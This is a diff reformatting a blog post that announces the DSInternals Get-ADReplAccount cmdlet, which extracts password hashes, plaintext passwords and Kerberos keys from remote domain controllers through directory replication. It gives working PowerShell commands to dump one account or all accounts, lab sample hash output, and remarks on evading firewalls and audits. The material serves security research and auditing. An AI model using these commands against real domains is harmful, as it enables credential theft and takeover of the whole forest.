@@ -5,37 +5,33 @@ date: 2015-08-04T10:38:08+00:00
 layout: post
 lang: en
 permalink: /en/retrieving-active-directory-passwords-remotely/
+tags:
+    - 'Active Directory'
+    - PowerShell
+    - Security
 ---
-<p style="text-align: justify;">
-  I&nbsp;have finally finished work on the <b>Get-ADReplAccount</b> cmdlet, the&nbsp;newest addition to&nbsp;my <a href="https://www.dsinternals.com/en/downloads/">DSInternals PowerShell Module</a>, that&nbsp;can retrieve <a href="https://technet.microsoft.com/en-us/library/hh994559.aspx">reversibly encrypted plaintext passwords</a>, password hashes and&nbsp;Kerberos keys of&nbsp;all user accounts from&nbsp;remote domain controllers. This is&nbsp;achieved by&nbsp;simulating the&nbsp;behavior of&nbsp;the <strong>dcromo</strong> tool and&nbsp;creating a&nbsp;replica of&nbsp;Active Directory database through the&nbsp;<a href="https://msdn.microsoft.com/en-us/library/cc228086.aspx">MS-DRSR</a> protocol. Furthermore, it has these properties:
-</p>
 
-<li style="text-align: justify;">
-  It does not even&nbsp;need the&nbsp;Domain Admins group membership. The&nbsp;<b>Replicating Directory Changes All</b> permission is&nbsp;more than&nbsp;enough for&nbsp;this cmdlet to&nbsp;do its job.
-</li>
-<li style="text-align: justify;">
-  It opens door to&nbsp;other attacks, e.g.&nbsp;pass-the-hash, pass-the-ticket or&nbsp;PAC spoofing, that&nbsp;can be used to&nbsp;seize control of&nbsp;the entire Active Directory forest. Long live <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>!
-</li>
-<li style="text-align: justify;">
-  It cannot be effectively blocked by&nbsp;firewalls, because&nbsp;the&nbsp;directory replication service (the <a href="http://IDL_DRSGetNCChanges">DRSGetNCChanges</a> call to&nbsp;be more precise) shares the&nbsp;same port with other critical services, like user name resolution (exposed by&nbsp;the <a href="https://msdn.microsoft.com/en-us/library/ms675970(v=vs.85).aspx">DsCrackNames</a> call).
-</li>
-<li style="text-align: justify;">
-  It only uses documented features of&nbsp;Active Directory and&nbsp;is&nbsp;not a&nbsp;hack per se.
-</li>
-<li style="text-align: justify;">
-  It leaves only minimal footprint on Domain Conrollers and&nbsp;can be easily overlooked by&nbsp;security audits.
-</li>
+I have finally finished work on the **Get-ADReplAccount** cmdlet, the newest addition to my [DSInternals PowerShell Module](https://www.dsinternals.com/en/downloads/), that can retrieve [reversibly encrypted plaintext passwords](https://technet.microsoft.com/en-us/library/hh994559.aspx), password hashes and Kerberos keys of all user accounts from remote domain controllers. This is achieved by simulating the behavior of the **dcromo** tool and creating a replica of Active Directory database through the [MS-DRSR](https://msdn.microsoft.com/en-us/library/cc228086.aspx) protocol. Furthermore, it has these properties:
+
+- It does not even need the Domain Admins group membership. The **Replicating Directory Changes All** permission is more than enough for this cmdlet to do its job.
+- It opens door to other attacks, e.g. pass-the-hash, pass-the-ticket or PAC spoofing, that can be used to seize control of the entire Active Directory forest. Long live [mimikatz](https://github.com/gentilkiwi/mimikatz)!
+- It cannot be effectively blocked by firewalls, because the directory replication service (the [DRSGetNCChanges](http://IDL_DRSGetNCChanges) call to be more precise) shares the same port with other critical services, like user name resolution (exposed by the [DsCrackNames](https://msdn.microsoft.com/en-us/library/ms675970(v=vs.85).aspx) call).
+- It only uses documented features of Active Directory and is not a hack per se.
+- It leaves only minimal footprint on Domain Conrollers and can be easily overlooked by security audits.
 
 Usage example:
 
-<pre class="lang:ps decode:true">Import-Module DSInternals
+```powershell
+Import-Module DSInternals
 $cred = Get-Credential
 Get-ADReplAccount -SamAccountName April -Domain Adatum -Server LON-DC1 `
--Credential $cred -Protocol TCP</pre>
+-Credential $cred -Protocol TCP
+```
 
 Sample output:
 
-<pre class="nums:false lang:default highlight:0 decode:true">DistinguishedName: CN=April Reagan,OU=IT,DC=Adatum,DC=com
+```
+DistinguishedName: CN=April Reagan,OU=IT,DC=Adatum,DC=com
 Sid: S-1-5-21-3180365339-800773672-3767752645-1375
 Guid: 124ae098-699b-4450-a47a-314a29cc90ea
 SamAccountName: April
@@ -135,10 +131,11 @@ SupplementalCredentials:
     Hash 26: e1e20982753c6a1140c1a8241b23b9ea
     Hash 27: e5ec1c63e0e549e49cda218bc3752051
     Hash 28: 26f2d85f7513d73dd93ab3afd2d90cf6
-    Hash 29: 84010d657e6b58ce233fae2bd7644222</pre>
+    Hash 29: 84010d657e6b58ce233fae2bd7644222
+```
 
-<p style="text-align: justify;">
-  You could even dump all accounts at once, but&nbsp;this can cause heavy (=suspicious) replication traffic:
-</p>
+You could even dump all accounts at once, but&nbsp;this can cause heavy (=suspicious) replication traffic:
 
-<pre class="lang:ps decode:true ">Get-ADReplAccount -All -NamingContext 'DC=Adatum,DC=com' -Server LON-DC1</pre>
+```powershell
+Get-ADReplAccount -All -NamingContext 'DC=Adatum,DC=com' -Server LON-DC1
+```
